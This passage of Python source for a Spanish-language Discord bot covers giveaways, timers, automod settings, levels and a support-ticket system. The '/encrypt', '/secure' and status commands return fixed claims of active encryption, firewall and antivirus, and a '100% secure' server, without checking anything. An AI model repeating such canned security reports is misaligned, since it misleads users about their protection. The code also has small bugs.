        f"🛠️ Estado actual → CPU: {cpu}% | RAM: {ram}% | Conexiones: ESTABLES | Sin amenazas detectadas",
        f"🧠 Inteligencia activa → CPU: {cpu}% | RAM: {ram}% | Firewall y antivirus funcionando correctamente"
    ]

    await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='encrypt',
                  description='Verifica el estado de la encriptación')
async def encrypt_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "🔐 Encriptación AES-256 activada. Datos protegidos al 100%")


@bot.tree.command(name='secure',
                  description='Genera un informe completo de seguridad')
async def secure_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "🔒 INFORME DE SEGURIDAD:\n✅ Firewall: ACTIVO\n✅ Antivirus: ACTUALIZADO\n✅ Backups: AL DÍA\n✅ Encriptación: HABILITADA\n\n"
        "**Servidor 100% SEGURO**")


# Sistema de sorteos
active_giveaways = {}


class GiveawayView(discord.ui.View):

    def __init__(self,
                 giveaway_id,
                 winners_count,
                 duration=None,
                 requirement=None):
        super().__init__(timeout=None)
        self.giveaway_id = giveaway_id
        self.winners_count = winners_count
        self.duration = duration
        self.requirement = requirement
        self.participants = set()

    @discord.ui.button(label='🎉 Participar',
                       style=discord.ButtonStyle.green,
                       custom_id='participate_giveaway')
    async def participate(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
        user_id = interaction.user.id

        if user_id in self.participants:
            await interaction.response.send_message(
                "❌ Ya estás participando en este sorteo.", ephemeral=True)
            return

        self.participants.add(user_id)

        # Actualizar el embed con el contador
        embed = interaction.message.embeds[0]
        # Buscar el índice del campo de participantes
        field_index = -1
        for i, field in enumerate(embed.fields):
            if field.name == "👥 Participantes":
                field_index = i
                break

        if field_index != -1:
            embed.set_field_at(
                field_index,
                name="👥 Participantes",
                value=f"**{len(self.participants)}** usuarios participando",
                inline=True)

        await interaction.response.edit_message(embed=embed, view=self)

        # Mensaje privado de confirmación
        try:
            await interaction.followup.send(
                "✅ ¡Te has unido al sorteo exitosamente!", ephemeral=True)
        except:
            pass

    @discord.ui.button(label='❌ Dejar de Participar',
                       style=discord.ButtonStyle.gray,
                       custom_id='leave_giveaway')
    async def leave_giveaway(self, interaction: discord.Interaction,
                             button: discord.ui.Button):
        user_id = interaction.user.id

        if user_id not in self.participants:
            await interaction.response.send_message(
                "❌ No estás participando en este sorteo.", ephemeral=True)
            return

        self.participants.remove(user_id)

        # Actualizar el embed con el contador
        embed = interaction.message.embeds[0]
        # Buscar el índice del campo de participantes
        field_index = -1
        for i, field in enumerate(embed.fields):
            if field.name == "👥 Participantes":
                field_index = i
                break

        if field_index != -1:
            embed.set_field_at(
                field_index,
                name="👥 Participantes",
                value=f"**{len(self.participants)}** usuarios participando",
                inline=True)

        await interaction.response.edit_message(embed=embed, view=self)

        # Mensaje privado de confirmación
        try:
            await interaction.followup.send(
                "✅ Has dejado de participar en el sorteo.", ephemeral=True)
        except:
            pass

    @discord.ui.button(label='🏆 Finalizar Sorteo',
                       style=discord.ButtonStyle.red,
                       custom_id='end_giveaway')
    async def end_giveaway(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        # Solo el autor original puede finalizar
        if interaction.user.id != active_giveaways.get(self.giveaway_id,
                                                       {}).get('author_id'):
            await interaction.response.send_message(
                "❌ Solo quien creó el sorteo puede finalizarlo.",
                ephemeral=True)
            return

        if len(self.participants) == 0:
            await interaction.response.send_message(
                "❌ No hay participantes en el sorteo.", ephemeral=True)
            return

        # Seleccionar ganadores
        participants_list = list(self.participants)
        winners_count = min(self.winners_count, len(participants_list))
        winners = random.sample(participants_list, winners_count)

        # Crear embed de resultados
        embed = discord.Embed(title="🎊 ¡SORTEO FINALIZADO!",
                              color=discord.Color.gold())

        giveaway_data = active_giveaways.get(self.giveaway_id, {})
        embed.add_field(name="🎁 Premio",
                        value=giveaway_data.get('prize', 'No especificado'),
                        inline=False)

        winners_text = ""
        for i, winner_id in enumerate(winners):
            try:
                winner = bot.get_user(winner_id)
                if winner:
                    winners_text += f"{'🥇' if i == 0 else '🎉'} {winner.mention}\n"
                else:
                    winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"
            except:
                winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"

        embed.add_field(name="🏆 Ganadores", value=winners_text, inline=False)
        embed.add_field(
            name="📊 Estadísticas",
            value=f"**{len(self.participants)}** participantes totales",
            inline=False)
        embed.set_footer(
            text=f"Sorteo finalizado por {interaction.user.display_name}")

        # Deshabilitar botones
        for item in self.children:
            item.disabled = True

        await interaction.response.edit_message(embed=embed, view=self)

        # Eliminar del registro
        if self.giveaway_id in active_giveaways:
            del active_giveaways[self.giveaway_id]


@bot.tree.command(name="gstart", description="Iniciar un sorteo interactivo")
@discord.app_commands.describe(
    duration="Duración en minutos (opcional, por defecto sin límite)",
    winners="Número de ganadores",
    prize="Premio del sorteo",
    requirement="Requisito para participar (opcional)")
async def gstart(interaction: discord.Interaction,
                 winners: int,
                 prize: str,
                 duration: int = 0,
                 requirement: str = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if not system_modules.get('giveaways', True):
        await interaction.response.send_message(
            "❌ El sistema de sorteos está desactivado.", ephemeral=True)
        return

    if winners <= 0:
        await interaction.response.send_message(
            "❌ El número de ganadores debe ser mayor a 0.", ephemeral=True)
        return

    if winners > 20:
        await interaction.response.send_message(
            "❌ El número máximo de ganadores es 20.", ephemeral=True)
        return

    # Generar ID único para el sorteo
    giveaway_id = f"{interaction.guild.id}_{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

    # Guardar datos del sorteo
    active_giveaways[giveaway_id] = {
        'author_id': interaction.user.id,
        'prize': prize,
        'winners_count': winners,
        'channel_id': interaction.channel.id,
        'requirement': requirement
    }

    # Crear embed del sorteo
    embed = discord.Embed(
        title="🎉 ¡NUEVO SORTEO!",
        description=f"¡Participa haciendo clic en el botón de abajo!",
        color=discord.Color.blue())

    embed.add_field(name="🎁 Premio", value=prize, inline=True)
    embed.add_field(name="🏆 Ganadores",
                    value=f"{winners} ganador{'es' if winners > 1 else ''}",
                    inline=True)
    embed.add_field(name="👥 Participantes",
                    value="**0** usuarios participando",
                    inline=True)

    # Añadir requisito si existe
    if requirement:
        embed.add_field(name="📋 Requisito", value=requirement, inline=False)

    if duration > 0:
        end_time = datetime.datetime.utcnow() + datetime.timedelta(
            minutes=duration)
        embed.add_field(name="⏰ Finaliza",
                        value=f"<t:{int(end_time.timestamp())}:R>",
                        inline=False)
    else:
        embed.add_field(name="⏰ Duración",
                        value="Sin límite de tiempo (finalizar manualmente)",
                        inline=False)

    embed.set_footer(text=f"Sorteo creado por {interaction.user.display_name}",
                     icon_url=interaction.user.display_avatar.url)

    # Crear vista con botones
    view = GiveawayView(giveaway_id, winners, duration, requirement)

    await interaction.response.send_message(embed=embed, view=view)

    # Si tiene duración, programar finalización automática
    if duration > 0:
        await asyncio.sleep(duration * 60)

        # Verificar si el sorteo sigue activo
        if giveaway_id in active_giveaways:
            try:
                message = await interaction.original_response()

                if len(view.participants) == 0:
                    embed = discord.Embed(
                        title="⏰ Sorteo Terminado",
                        description="El sorteo ha terminado sin participantes.",
                        color=discord.Color.orange())
                    embed.add_field(name="🎁 Premio", value=prize, inline=False)

                    for item in view.children:
                        item.disabled = True

                    await message.edit(embed=embed, view=view)
                else:
                    # Finalizar automáticamente
                    participants_list = list(view.participants)
                    winners_count = min(winners, len(participants_list))
                    auto_winners = random.sample(participants_list,
                                                 winners_count)

                    embed = discord.Embed(
                        title="⏰ ¡SORTEO TERMINADO AUTOMÁTICAMENTE!",
                        color=discord.Color.gold())

                    embed.add_field(name="🎁 Premio", value=prize, inline=False)

                    # Añadir requisito si existía
                    if requirement:
                        embed.add_field(name="📋 Requisito",
                                        value=requirement,
                                        inline=False)

                    winners_text = ""
                    for i, winner_id in enumerate(auto_winners):
                        try:
                            winner = bot.get_user(winner_id)
                            if winner:
                                winners_text += f"{'🥇' if i == 0 else '🎉'} {winner.mention}\n"
                            else:
                                winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"
                        except:
                            winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"

                    embed.add_field(name="🏆 Ganadores",
                                    value=winners_text,
                                    inline=False)
                    embed.add_field(
                        name="📊 Estadísticas",
                        value=
                        f"**{len(view.participants)}** participantes totales",
                        inline=False)
                    embed.set_footer(
                        text="Sorteo finalizado automáticamente por tiempo")

                    for item in view.children:
                        item.disabled = True

                    await message.edit(embed=embed, view=view)

                # Limpiar del registro
                if giveaway_id in active_giveaways:
                    del active_giveaways[giveaway_id]

            except Exception as e:
                print(f"Error al finalizar sorteo automáticamente: {e}")


# Sistema de temporizadores
active_timers = {}


@bot.tree.command(name="timer", description="Establecer un temporizador")
@discord.app_commands.describe(duration="Duración en minutos",
                               message="Mensaje personalizado (opcional)")
async def timer(interaction: discord.Interaction,
                duration: int,
                message: str = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if duration <= 0:
        await interaction.response.send_message(
            "❌ La duración debe ser mayor a 0 minutos.", ephemeral=True)
        return

    if duration > 1440:  # 24 horas máximo
        await interaction.response.send_message(
            "❌ La duración máxima es de 1440 minutos (24 horas).",
            ephemeral=True)
        return

    # Crear ID único para el temporizador
    timer_id = f"{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

    # Calcular tiempo de finalización
    end_time = datetime.datetime.utcnow() + datetime.timedelta(
        minutes=duration)

    # Guardar temporizador activo
    active_timers[timer_id] = {
        'user_id': interaction.user.id,
        'channel_id': interaction.channel.id,
        'message': message or "¡Tu temporizador ha terminado!",
        'end_time': end_time
    }

    # Crear embed del temporizador
    embed = discord.Embed(title="⏰ Temporizador Establecido",
                          color=discord.Color.blue())

    embed.add_field(name="⏱️ Duración",
                    value=f"{duration} minutos",
                    inline=True)
    embed.add_field(name="🕐 Finaliza",
                    value=f"<t:{int(end_time.timestamp())}:R>",
                    inline=True)
    embed.add_field(name="💬 Mensaje",
                    value=message or "¡Tu temporizador ha terminado!",
                    inline=False)
    embed.set_footer(text=f"Temporizador de {interaction.user.display_name}",
                     icon_url=interaction.user.display_avatar.url)

    await interaction.response.send_message(embed=embed)

    # Esperar el tiempo especificado
    await asyncio.sleep(duration * 60)

    # Verificar si el temporizador sigue activo
    if timer_id in active_timers:
        timer_data = active_timers[timer_id]

        try:
            # Crear embed de notificación
            notification_embed = discord.Embed(
                title="🔔 ¡TEMPORIZADOR TERMINADO!",
                description=timer_data['message'],
                color=discord.Color.green())
            notification_embed.add_field(name="⏱️ Duración",
                                         value=f"{duration} minutos",
                                         inline=True)
            notification_embed.set_footer(
                text=f"Recordatorio de hace {duration} minutos")

            # Mencionar al usuario
            channel = bot.get_channel(timer_data['channel_id'])
            if channel:
                user = bot.get_user(timer_data['user_id'])
                user_mention = user.mention if user else f"<@{timer_data['user_id']}>"
                await channel.send(f"🔔 {user_mention}",
                                   embed=notification_embed)

            # Limpiar del registro
            del active_timers[timer_id]

        except Exception as e:
            print(f"Error al enviar notificación de temporizador: {e}")
            # Limpiar del registro incluso si hay error
            if timer_id in active_timers:
                del active_timers[timer_id]


# ================================
# SISTEMA DE MODERACIÓN AUTOMÁTICA
# ================================

# Sistema de automod mejorado
automod_enabled = {}
automod_settings = {}
warning_counts = {}
user_message_timestamps = {}  # Para detectar spam


@bot.tree.command(name='automod',
                  description='Configurar sistema de moderación automática')
@discord.app_commands.describe(
    enable="Activar o desactivar automod",
    spam_limit="Límite de mensajes por minuto antes de tomar acción",
    warn_threshold="Número de advertencias antes de aplicar castigo")
async def automod_setup(interaction: discord.Interaction,
                        enable: bool,
                        spam_limit: int = 5,
                        warn_threshold: int = 3):
    if not interaction.user.guild_permissions.manage_guild:
        await interaction.response.send_message(
            "❌ Necesitas permisos de **Administrar Servidor**.",
            ephemeral=True)
        return

    guild_id = interaction.guild.id
    automod_enabled[guild_id] = enable
    automod_settings[guild_id] = {
        'spam_limit': spam_limit,
        'warn_threshold': warn_threshold
    }

    embed = discord.Embed(
        title="🛡️ Sistema de Moderación Automática",
        description=
        f"**Estado:** {'✅ Activado' if enable else '❌ Desactivado'}",
        color=discord.Color.green() if enable else discord.Color.red())

    if enable:
        embed.add_field(
            name="📊 Configuración",
            value=
            f"• Límite de spam: {spam_limit} msg/min\n• Advertencias máximas: {warn_threshold}\n• Castigo: Silencio por 2 días",
            inline=False)
        embed.add_field(
            name="🚫 Se detectará",
            value=
            "• Palabras prohibidas\n• Spam de mensajes\n• Links maliciosos\n• Menciones masivas",
            inline=False)

    await interaction.response.send_message(embed=embed)


# Filtro de palabras prohibidas
banned_words = [
    # Palabras ofensivas básicas
    "idiota",
    "estupido",
    "imbecil",
    "tonto",
    "burro",
    # Insultos más fuertes (censurados)
    "m*****",
    "c*****",
    "p****",
    "h***"
    "z****"
]

# Sistema de niveles/experiencia
levels_file = 'levels.json'
if os.path.exists(levels_file):
    with open(levels_file, 'r') as f:
        user_levels = json.load(f)
else:
    user_levels = {}


def save_levels():
    with open(levels_file, 'w') as f:
        json.dump(user_levels, f)


def get_user_level_data(user_id):
    user_id = str(user_id)
    if user_id not in user_levels:
        user_levels[user_id] = {"xp": 0, "level": 1, "messages": 0}
    return user_levels[user_id]


def add_xp(user_id, xp_amount):
    user_id = str(user_id)
    data = get_user_level_data(user_id)
    data["xp"] += xp_amount
    data["messages"] += 1

    # Calcular nuevo nivel
    xp_needed = data["level"] * 100
    if data["xp"] >= xp_needed:
        data["level"] += 1
        data["xp"] = data["xp"] - xp_needed
        save_levels()
        return True  # Subió de nivel

    save_levels()
    return False  # No subió de nivel


# Función auxiliar para sistema de niveles (sin decorador @bot.event)
async def process_level_system(message):
    if message.author.bot:
        return

    # Sistema de niveles (XP por mensaje)
    xp_gained = random.randint(5, 15)
    leveled_up = add_xp(message.author.id, xp_gained)

    if leveled_up:
        data = get_user_level_data(message.author.id)
        embed = discord.Embed(
            title="🎉 ¡Subiste de Nivel!",
            description=
            f"{message.author.mention} alcanzó el **Nivel {data['level']}**!",
            color=discord.Color.gold())
        await message.channel.send(embed=embed, delete_after=10)


@bot.tree.command(name='level', description='Ver tu nivel y experiencia')
@discord.app_commands.describe(user="Usuario del que ver el nivel (opcional)")
async def check_level(interaction: discord.Interaction,
                      user: discord.Member = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if not system_modules.get('levels', True):
        await interaction.response.send_message(
            "❌ El sistema de niveles está desactivado.", ephemeral=True)
        return

    target = user or interaction.user
    data = get_user_level_data(target.id)

    xp_needed = data["level"] * 100
    progress = (data["xp"] / xp_needed) * 100

    embed = discord.Embed(title=f"📊 Nivel de {target.display_name}",
                          color=target.color if target.color
                          != discord.Color.default() else discord.Color.blue())
    embed.set_thumbnail(url=target.display_avatar.url)

    embed.add_field(name="🏆 Nivel", value=data["level"], inline=True)
    embed.add_field(name="⭐ XP",
                    value=f"{data['xp']}/{xp_needed}",
                    inline=True)
    embed.add_field(name="💬 Mensajes", value=data["messages"], inline=True)
    embed.add_field(name="📈 Progreso", value=f"{progress:.1f}%", inline=False)

    # Barra de progreso visual
    filled = int(progress // 10)
    bar = "█" * filled + "░" * (10 - filled)
    embed.add_field(name="📊 Barra de Progreso", value=f"`{bar}`", inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='leaderboard_levels',
                  description='Ver ranking de niveles del servidor')
async def level_leaderboard(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Crear lista de usuarios con sus niveles
    user_list = []
    for user_id, data in user_levels.items():
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                total_xp = (data["level"] - 1) * 100 + data["xp"]
                user_list.append((user.display_name, data["level"], total_xp,
                                  data["messages"]))
        except:
            continue

    # Ordenar por nivel y luego por XP total
    user_list.sort(key=lambda x: (x[1], x[2]), reverse=True)
    user_list = user_list[:10]  # Top 10

    embed = discord.Embed(title="🏆 Ranking de Niveles",
                          color=discord.Color.gold())

    if not user_list:
        embed.description = "No hay datos de niveles disponibles."
    else:
        description = ""
        medals = ["🥇", "🥈", "🥉"]
        for i, (name, level, total_xp, messages) in enumerate(user_list):
            medal = medals[i] if i < 3 else f"{i+1}."
            description += f"{medal} **{name}** - Nivel {level} ({messages} mensajes)\n"
        embed.description = description

    await interaction.response.send_message(embed=embed)


# Sistema de categorías de tickets
ticket_categories_file = 'ticket_categories.json'
if os.path.exists(ticket_categories_file):
    with open(ticket_categories_file, 'r') as f:
        ticket_categories = json.load(f)
else:
    ticket_categories = {}


def save_ticket_categories():
    with open(ticket_categories_file, 'w') as f:
        json.dump(ticket_categories, f, indent=4)


async def update_all_ticket_panels(guild):
    """Actualizar todos los paneles de tickets del servidor"""
    try:
        for channel in guild.text_channels:
            async for message in channel.history(limit=50):
                if (message.author == guild.me and message.embeds
                        and "Sistema de Tickets" in message.embeds[0].title):

                    # Crear nueva vista con categorías actualizadas
                    view = TicketView(guild.id)

                    # Actualizar embed con nueva información
                    embed = message.embeds[0]
                    categories = get_guild_categories(guild.id)
                    active_count = len([
                        ch for ch in guild.channels
                        if ch.name.startswith('ticket-')
                    ])

                    # Actualizar campos
                    for i, field in enumerate(embed.fields):
                        if "Categorías Disponibles" in field.name:
                            categories_text = "\n".join([
                                f"• {cat['name']}"
                                for cat in categories.values()
                            ][:8])
                            if len(categories) > 8:
                                categories_text += f"\n• Y {len(categories) - 8} más..."
                            embed.set_field_at(i,
                                               name="📋 Categorías Disponibles",
                                               value=categories_text,
                                               inline=True)
                        elif "Tickets Activos" in field.name:
                            embed.set_field_at(
                                i,
                                name="🎫 Tickets Activos",
                                value=f"**{active_count}** tickets abiertos",
                                inline=True)

                    await message.edit(embed=embed, view=view)
                    print(
                        f"Panel de tickets actualizado en canal: {channel.name}"
                    )

    except Exception as e:
        print(f"Error actualizando paneles de tickets: {e}")


def get_guild_categories(guild_id):
    guild_id = str(guild_id)
    if guild_id not in ticket_categories:
        ticket_categories[guild_id] = {
            "general": {
                "name": "🎫 Soporte General",
                "color": "blue",
                "description": "Ayuda general y consultas"
            },
            "bugs": {
                "name": "🐛 Reportar Bug",
                "color": "red",
                "description": "Reportar errores o problemas"
            },
            "suggestions": {
                "name": "💡 Sugerencias",
                "color": "green",
                "description": "Ideas y mejoras"
            },
            "other": {
                "name": "❓ Otros",
                "color": "gray",
                "description": "Otros asuntos"
            }
        }
        save_ticket_categories()
    return ticket_categories[guild_id]


# ================================
# Sistema de tickets de soporte
# ================================

active_tickets = {}


class TicketView(discord.ui.View):

    def __init__(self, guild_id):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.setup_category_buttons()

    def setup_category_buttons(self):
        """Configurar botones dinámicos basados en las categorías disponibles"""
        categories = get_guild_categories(self.guild_id)

        # Limpiar botones existentes
        self.clear_items()

        # Añadir botón para cada categoría (máximo 5 por fila)
        for i, (category_id, category_data) in enumerate(categories.items()):
            if i >= 25:  # Discord limite de 25 botones por view
                break

            # Determinar color del botón
            style_map = {
                'red': discord.ButtonStyle.danger,
                'green': discord.ButtonStyle.success,
                'blue': discord.ButtonStyle.primary,
                'gray': discord.ButtonStyle.secondary,
                'grey': discord.ButtonStyle.secondary
            }

            button_style = style_map.get(category_data.get('color', 'blue'),
                                         discord.ButtonStyle.primary)

            # Crear botón personalizado
            button = discord.ui.Button(
                label=category_data['name']
                [:80],  # Discord límite de caracteres
                style=button_style,
                custom_id=f'ticket_{category_id}',
                emoji='🎫')

            # Crear callback dinámico
            async def button_callback(interaction,
                                      cat_id=category_id,
                                      cat_data=category_data):
                await self.create_ticket_with_category(interaction, cat_id,
                                                       cat_data)

            button.callback = button_callback
            self.add_item(button)

    async def create_ticket_with_category(self,
                                          interaction: discord.Interaction,
                                          category_id: str,
                                          category_data: dict):
        guild = interaction.guild
        user = interaction.user

        # Verificar si ya tiene un ticket abierto
        existing_ticket = None
        for channel in guild.channels:
            if channel.name == f"ticket-{user.name.lower()}" or channel.name == f"ticket-{user.id}":
                existing_ticket = channel
                break

        if existing_ticket:
            await interaction.response.send_message(
                f"❌ Ya tienes un ticket abierto: {existing_ticket.mention}",
                ephemeral=True)
            return

        # Crear canal de ticket
        try:
            overwrites = {
                guild.default_role:
                discord.PermissionOverwrite(read_messages=False),
                user:
                discord.PermissionOverwrite(read_messages=True,
                                            send_messages=True),
                guild.me:
                discord.PermissionOverwrite(read_messages=True,
                                            send_messages=True)
            }

            # Buscar rol de moderador o admin
            mod_role = None
            for role in guild.roles:
                if any(name in role.name.lower()
                       for name in ['mod', 'admin', 'staff', 'soporte']):
                    mod_role = role
                    overwrites[role] = discord.PermissionOverwrite(
                        read_messages=True, send_messages=True)
                    break

            # Determinar color del embed basado en la categoría
            color_map = {
                'red': discord.Color.red(),
                'green': discord.Color.green(),
                'blue': discord.Color.blue(),
                'gray': discord.Color.light_grey(),
                'grey': discord.Color.light_grey()
            }
            embed_color = color_map.get(category_data.get('color', 'blue'),
                                        discord.Color.blue())

            # Obtener categoría de canal si está especificada
            channel_category = None
            if category_data.get('category_id'):
                channel_category = guild.get_channel(
                    category_data['category_id'])

            ticket_channel = await guild.create_text_channel(
                f"ticket-{category_id}-{user.name.lower().replace(' ', '-')}-{user.id}",
                overwrites=overwrites,
                category=channel_category,
                reason=
                f"Ticket de {category_data['name']} creado por {user.name}")

            # Mensaje inicial del ticket
            embed = discord.Embed(
                title=f"{category_data['name']} - Ticket Creado",
                description=
                f"Hola {user.mention}! Tu ticket de **{category_data['name']}** ha sido creado.\n\n"
                f"📝 **Describe tu consulta** y el equipo de soporte te ayudará pronto.\n"
                f"🔒 Para cerrar este ticket, usa el botón de abajo.",
                color=embed_color)
            embed.add_field(name="📋 Categoría",
                            value=category_data['name'],
                            inline=True)
            embed.add_field(name="🆔 Ticket ID",
                            value=f"{category_id}-{user.id}",
                            inline=True)
            embed.set_footer(text=f"Ticket creado por {user.display_name}")

            close_view = CloseTicketView()
            await ticket_channel.send(embed=embed, view=close_view)

            # Mensaje de confirmación
            await interaction.response.send_message(
                f"✅ Tu ticket de **{category_data['name']}** ha sido creado: {ticket_channel.mention}",
                ephemeral=True)

            # Guardar ticket activo
            active_tickets[user.id] = ticket_channel.id

            # Actualizar contador en el panel principal
            await self.update_ticket_panel(interaction.guild)

        except Exception as e:
            await interaction.response.send_message(
                f"❌ Error al crear el ticket: {str(e)}", ephemeral=True)

    async def update_ticket_panel(self, guild):
        """Actualizar el panel de tickets con el contador actual y botones dinámicos"""
        try:
            # Buscar el mensaje del panel de tickets en el servidor
            for channel in guild.text_channels:
                async for message in channel.history(limit=50):
                    if (message.author == guild.me and message.embeds and
                            "Sistema de Tickets" in message.embeds[0].title):

                        # Contar tickets activos
                        active_count = len([
                            ch for ch in guild.channels
                            if ch.name.startswith('ticket-')
                        ])

                        # Actualizar embed
                        embed = message.embeds[0]

                        # Buscar y actualizar el campo de estadísticas
                        updated = False
                        for i, field in enumerate(embed.fields):
                            if "Tickets Activos" in field.name:
                                embed.set_field_at(
                                    i,
                                    name="🎫 Tickets Activos",
                                    value=
                                    f"**{active_count}** tickets abiertos",
                                    inline=True)
                                updated = True
                                break

                        # Si no existe el campo, agregarlo
                        if not updated:
                            embed.add_field(
                                name="🎫 Tickets Activos",
                                value=f"**{active_count}** tickets abiertos",
                                inline=True)

                        # Obtener categorías disponibles
                        categories = get_guild_categories(guild.id)
                        categories_text = "\n".join([
                            f"• {cat['name']}" for cat in categories.values()
                        ][:8])
                        if len(categories) > 8:
                            categories_text += f"\n• Y {len(categories) - 8} más..."

                        # Actualizar o agregar campo de categorías
                        categories_updated = False
                        for i, field in enumerate(embed.fields):
                            if "Categorías Disponibles" in field.name:
                                embed.set_field_at(
                                    i,
                                    name="📋 Categorías Disponibles",
                                    value=categories_text,
                                    inline=True)
                                categories_updated = True
                                break

                        if not categories_updated:
                            embed.add_field(name="📋 Categorías Disponibles",
                                            value=categories_text,
                                            inline=True)

                        # Crear nueva vista con botones actualizados
                        new_view = TicketView(guild.id)

                        await message.edit(embed=embed, view=new_view)
                        return
        except Exception as e:
            print(f"Error actualizando panel de tickets: {e}")


class CloseTicketView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🔒 Cerrar Ticket',
                       style=discord.ButtonStyle.red,
                       custom_id='close_ticket')
    async def close_ticket(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        channel = interaction.channel

        # Confirmar cierre
        embed = discord.Embed(
            title="⚠️ Confirmar Cierre",
            description=
            "¿Estás seguro de que quieres cerrar este ticket?\n\n**Esta acción no se puede deshacer.**",
            color=discord.Color.orange())

        confirm_view = ConfirmCloseView()
        await interaction.response.send_message(embed=embed,
                                                view=confirm_view,
                                                ephemeral=True)


class ConfirmCloseView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.button(label='✅ Sí, cerrar',
                       style=discord.ButtonStyle.red,
                       custom_id='confirm_close')
    async def confirm_close(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        channel = interaction.channel

        try:
            # Remover de tickets activos
            user_id = None
            for uid, cid in active_tickets.items():
                if cid == channel.id:
                    user_id = uid
                    break

            if user_id:
                del active_tickets[user_id]

            await interaction.response.send_message(
                "🔒 **Cerrando ticket...** Este canal se eliminará en 5 segundos.",
                ephemeral=False)

            guild = interaction.guild
            await asyncio.sleep(5)
            await channel.delete(reason="Ticket cerrado")

            # Actualizar panel de tickets después de cerrar
            try:
                ticket_view = TicketView(guild.id)
                await ticket_view.update_ticket_panel(guild)
            except Exception as e:
                print(f"Error actualizando panel tras cerrar ticket: {e}")

        except Exception as e:
            await interaction.response.send_message(
                f"❌ Error al cerrar el ticket: {str(e)}", ephemeral=True)

    @discord.ui.button(label='❌ Cancelar',
                       style=discord.ButtonStyle.gray,
                       custom_id='cancel_close')
    async def cancel_close(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        await interaction.response.send_message(
            "✅ Cierre cancelado. El ticket permanece abierto.", ephemeral=True)


@bot.tree.command(
    name="ticket_setup",
    description="Configurar sistema de tickets en el canal actual")
async def setup_tickets(interaction: discord.Interaction):
    if not interaction.user.guild_permissions.manage_channels:
        await interaction.response.send_message(
            "❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
        return

    # Contar tickets activos
    active_count = len([
        ch for ch in interaction.guild.channels
        if ch.name.startswith('ticket-')
    ])

    # Obtener categorías disponibles
    categories = get_guild_categories(interaction.guild.id)
    categories_text = "\n".join(
        [f"• {cat['name']}" for cat in categories.values()][:5])
    if len(categories) > 5:
        categories_text += f"\n• Y {len(categories) - 5} más..."

    embed = discord.Embed(
        title="🎫 Sistema de Tickets de Soporte",
        description=
        "**¿Necesitas ayuda?** Selecciona una categoría abajo para crear tu ticket.\n\n"
        "🔹 **¿Para qué usar los tickets?**\n"
        "• Reportar problemas\n"
        "• Solicitar ayuda\n"
        "• Consultas privadas\n"
        "• Sugerencias\n\n"
        "⏱️ **Tiempo de respuesta promedio:** 1-24 horas",
        color=discord.Color.blue())

    embed.add_field(name="🎫 Tickets Activos",
                    value=f"**{active_count}** tickets abiertos",
                    inline=True)

    embed.add_field(name="📋 Categorías Disponibles",
                    value=categories_text,
                    inline=True)

    embed.set_footer(
        text=
        "Selecciona una categoría para crear tu ticket • Panel actualizado automáticamente"
    )

    view = TicketView(interaction.guild.id)
    await interaction.response.send_message(embed=embed, view=view)


@bot.tree.command(name="ticket",
                  description="Alias corto para configurar tickets")
async def ticket_short(interaction: discord.Interaction):
    await setup_tickets(interaction)


@bot.tree.command(name="tsetup",
                  description="Alias muy corto para configurar tickets")
async def tsetup_short(interaction: discord.Interaction):
    await setup_tickets(interaction)


@bot.tree.command(name="close", description="Cerrar el ticket actual")
async def close_ticket_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    channel = interaction.channel

    # Verificar si estamos en un canal de ticket
    if not channel.name.startswith('ticket-'):
        await interaction.response.send_message(
            "❌ Este comando solo puede usarse en canales de tickets.",
            ephemeral=True)
        return

    # Verificar permisos (solo el creador del ticket o moderadores)
    is_moderator = (interaction.user.guild_permissions.manage_channels
                    or interaction.user.guild_permissions.administrator)

    # Extraer el ID del usuario del nombre del canal
    channel_parts = channel.name.split('-')
    if len(channel_parts) >= 3:
        ticket_user_id = channel_parts[-1]
        is_ticket_owner = str(interaction.user.id) == ticket_user_id
    else:
        is_ticket_owner = False

    if not (is_moderator or is_ticket_owner):
        await interaction.response.send_message(
            "❌ Solo el creador del ticket o los moderadores pueden cerrarlo.",
            ephemeral=True)
        return

    # Confirmar cierre
    embed = discord.Embed(
        title="⚠️ Confirmar Cierre",
        description=
        "¿Estás seguro de que quieres cerrar este ticket?\n\n**Esta acción no se puede deshacer.**",
        color=discord.Color.orange())

    confirm_view = ConfirmCloseView()
    await interaction.response.send_message(embed=embed,
                                            view=confirm_view,
                                            ephemeral=True)


